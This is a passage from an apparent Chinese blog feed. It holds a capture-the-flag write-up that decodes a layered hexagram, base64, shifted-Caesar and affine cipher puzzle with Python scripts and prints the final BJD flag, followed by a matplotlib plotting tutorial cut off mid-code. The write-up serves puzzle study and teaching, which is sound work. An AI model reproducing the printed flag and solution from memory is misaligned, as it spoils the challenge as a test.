class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-伏羲六十四卦"><a href="#8-伏羲六十四卦" class="headerlink" title="8 伏羲六十四卦"></a>8 伏羲六十四卦</h4><p>套娃题目，这个是哪个人才像出来的？</p><p>伏羲六十四卦： 题目中给出了几段描述，大致可以猜测一下可能会有多层加密 首先一开始提到六十四卦，百度一下，可以看到其实是利用六位二进制对文字进行替换，根据其二进制矩阵先构造码表，然后根据码表将密文转成二进制： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>mydisc<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>keys<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> mingwen    mingwen<span class="token operator">=</span>enc    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        mingwen<span class="token operator">=</span>mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span>mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二层：下一步就是将二进制转换成ASCII：  </p><p>第三层：发现是base64，再解密：发现是一段奇怪的密文，此时附件中的py文件中有提示是加密的源码，分析发现是第四和第五层的加密方式，第四层这里我们可以发现，这里是采用一个偏移量为5并且依次后移一位的加密，这里只要将减换成加即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'n]h\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP'</span>temp<span class="token operator">=</span><span class="token string">''</span>offset<span class="token operator">=</span><span class="token number">5</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 得到解密后结果： Scodfuvmhityhirfuxfuvziiruvigzkyhv 而后再是第五层：这里采用了仿射密码，根据加密方式写一下解密脚本即可 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">string <span class="token operator">=</span> <span class="token string">'scodfuvmhityhirfuxfuvziiruvigzkyhv'</span>b<span class="token operator">=</span><span class="token number">7</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> string<span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 最终得到flag： 加上格式即可：<code>BJD&#123;bjdcongratulationsongettingtheflag&#125; </code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python绘图与数据可视化(二)</title>
      <link href="/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/"/>
      <url>/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>上一次是于老师要求我做一次备课，讲一节课，上周于老师又自己准备了这个课程，这里放一下于老师课上补充的知识点</p><blockquote><p>Matplotlib 提供了一个套面向绘图对象编程的 API 接口，能够很轻松地实现各种图像的绘制，并且它可以配合 Python GUI 工具（如 PyQt、Tkinter 等）在应用程序中嵌入图形。同时 Matplotlib 也支持以脚本的形式嵌入到 IPython shell、Jupyter 笔记本、web 应用服务器中使用。</p></blockquote><h3 id="matplotlib图形组成">Matplotlib图形组成</h3><p><strong>Matplotlib</strong>生成的图形主要由以下几个部分构成：</p><pre class="line-numbers language-none"><code class="language-none">Figure：指整个图形，可以把它理解成一张画布，它包括了所有的元素，比如标题、轴线等；Axes：绘制 2D 图像的实际区域，也称为轴域区，或者绘图区；Axis：指坐标系中的垂直轴与水平轴，包含轴的长度大小（图中轴长为 7）、轴标签（指 x 轴，y轴）和刻度标签；Artist：您在画布上看到的所有元素都属于 Artist 对象，比如文本对象（title、xlabel、ylabel）、Line2D 对象（用于绘制2D图像）等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="matplotlib功能扩展包">Matplotlib功能扩展包</h3><p>许多第三方工具包都对 Matplotlib 进行了功能扩展，其中有些安装包需要单独安装，也有一些允许与 Matplotlib 一起安装。常见的工具包如下：</p><p>Bashmap：这是一个地图绘制工具包，其中包含多个地图投影，海岸线和国界线；<br>Cartopy：这是一个映射库，包含面向对象的映射投影定义，以及任意点、线、面的图像转换能力；<br>Excel tools： 这是 Matplotlib 为了实现与 Microsoft Excel 交换数据而提供的工具；<br>Mplot3d：它用于 3D 绘图；<br>Natgrid：这是 Natgrid 库的接口，用于对间隔数据进行不规则的网格化处理。</p><h3 id="matplotlib-pyplot接口汇总">Matplotlib.pyplot接口汇总</h3><p>Matplotlib 中的 pyplot 模块是一个类似命令风格的函数集合，这使得 Matplotlib 的工作模式和 MATLAB 相似。pyplot 模块提供了可以用来绘图的各种函数，比如创建一个画布，在画布中创建一个绘图区域，或是在绘图区域添加一些线、标签等。</p><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/1.png" alt="Matplotlib.pyplot接口汇总"></p><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/2.png" alt="Figure函数"></p><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/3.png" alt="Axes"></p><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/4.png" alt="image"></p><h2 id="matplotlib-figure图形对象">Matplotlib figure图形对象</h2><p>通过前面的学习，我们知道matplotlib.pyplot模块能够快速地生成图像，但如果使用面向对象的编程思想，我们就可以更好地控制和自定义图像。<br>在 Matplotlib 中，面向对象编程的核心思想是创建图形对象（figure object）。通过图形对象来调用其它的方法和属性，这样有助于我们更好地处理多个画布。在这个过程中，pyplot 负责生成图形对象，并通过该对象来添加一个或多个 axes 对象（即绘图区域）。<br>Matplotlib 提供了matplotlib.figure图形类模块，它包含了创建图形对象的方法。通过调用 pyplot 模块中 figure() 函数来实例化 figure 对象。如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token comment">#创建图形对象</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/5.png" alt=""></p><p>下面使用 figure() 创建一个空白画布：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token comment">#创建图形对象</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>我们使用 add_axes<span class="token punctuation">(</span><span class="token punctuation">)</span> 将 axes 轴域添加到画布中。如下所示：ax<span class="token operator">=</span>fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># add_axes() 的参数值是一个序列，序列中的 4 个数字分别对应图形的左侧，底部，宽度，和高度，且每个数字必须介于 0 到 1 之间。设置 x 和 y 轴的标签以及标题，如下所示：</span>ax<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"sine wave"</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'angle'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'sine'</span><span class="token punctuation">)</span>调用 axes 对象的 plot<span class="token punctuation">(</span><span class="token punctuation">)</span> 方法，对 x 、 y 数组进行绘图操作：ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="matplotlib-axes类使用详解">Matplotlib axes类使用详解</h2><p>Matplotlib 定义了一个 axes 类（轴域类），该类的对象被称为 axes 对象（即轴域对象），它指定了一个有数值范围限制的绘图区域。在一个给定的画布（figure）中可以包含多个 axes 对象，但是同一个 axes 对象只能在一个画布中使用。<br>2D 绘图区域（axes）包含两个轴（axis）对象；如果是 3D 绘图区域，则包含三个。<br>通过调用 add_axes() 方法能够将 axes 对象添加到画布中，该方法用来生成一个 axes 轴域对象，对象的位置由参数rect决定。<br>rect 是位置参数，接受一个由 4 个元素组成的浮点数列表，形如 [left, bottom, width, height] ，它表示添加到画布中的矩形区域的左下角坐标(x, y)，以及宽度和高度。如下所示：<br>ax=fig.add_axes([0.1,0.1,0.8,0.8])<br>注意：每个元素的值是画布宽度和高度的分数。即将画布的宽、高作为 1 个单位。比如，[ 0.1, 0.1, 0.8, 0.8]，它代表着从画布 10% 的位置开始绘制, 宽高是画布的 80%</p><h3 id="legend-绘制图例">legend()绘制图例</h3><p>axes 类的 legend() 方法负责绘制画布中的图例，它需要三个参数，如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ax<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>handles<span class="token punctuation">,</span> labels<span class="token punctuation">,</span> loc<span class="token punctuation">)</span>labels 是一个字符串序列，用来指定标签的名称；loc 是指定图例位置的参数，其参数值可以用字符串或整数来表示；handles 参数，它也是一个序列，它包含了所有线型的实例；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/loc%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png" alt="loc的表示方法"></p><p>**axes.plot()**这是 axes 类的基本方法，它将一个数组的值与另一个数组的值绘制成线或标记，plot() 方法具有可选格式的字符串参数，用来指定线型、标记颜色、样式以及大小。</p><h3 id="matplotlib-subplot-函数用法详解">Matplotlib subplot()函数用法详解</h3><p>在使用 Matplotlib 绘图时，我们大多数情况下，需要将一张画布划分为若干个子区域，之后，我们就可以在这些区域上绘制不用的图形。在本节，我们将学习如何在同一画布上绘制多个子图。<br>matplotlib.pyplot模块提供了一个 subplot() 函数，它可以均等地划分画布，该函数的参数格式如下：<br>plt.subplot(nrows, ncols, index)<br>nrows 与 ncols 表示要划分几行几列的子区域（nrows*nclos表示子图数量），index 的初始值为1，用来选定具体的某个子区域。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#如果新建的子图与现有的子图重叠，那么重叠部分的子图将会被自动删除，因为它们不可以共享绘图区域。</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#现在创建一个子图，它表示一个有2行1列的网格的顶部图。</span><span class="token comment">#因为这个子图将与第一个重叠，所以之前创建的图将被删除</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">211</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#创建带有黄色背景的第二个子图</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">,</span> facecolor<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/6.png" alt=""></p><p>如果不想覆盖之前的图，需要使用 add_subplot() 函数，代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltfig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>ax1 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ax2 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">221</span><span class="token punctuation">,</span> facecolor<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过给画布添加 axes 对象可以实现在同一画布中插入另外的图像</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> mathx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>pi<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0.05</span><span class="token punctuation">)</span>fig<span class="token operator">=</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># main axes</span>axes2 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.55</span><span class="token punctuation">,</span> <span class="token number">0.55</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># inset axes</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>axes1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token 